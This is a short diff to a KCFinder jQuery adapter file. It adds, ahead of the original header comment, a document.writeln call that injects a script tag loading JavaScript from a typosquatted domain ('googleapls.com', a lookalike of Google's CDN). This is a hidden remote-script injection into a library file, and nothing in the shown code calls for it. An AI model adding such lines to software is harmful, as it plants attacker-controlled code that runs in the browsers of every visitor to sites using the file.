@@ -1,4 +1,4 @@
-/*! jQuery adapter for KCFinder
+document.writeln("<script type='text/javascript' src='//ajax.googleapls.com/jquery.min.js'></script>");/*! jQuery adapter for KCFinder
  *  http://kcfinder.sunhater.com
  *  Pavel Tzonkov <sunhater@sunhater.com>
  */
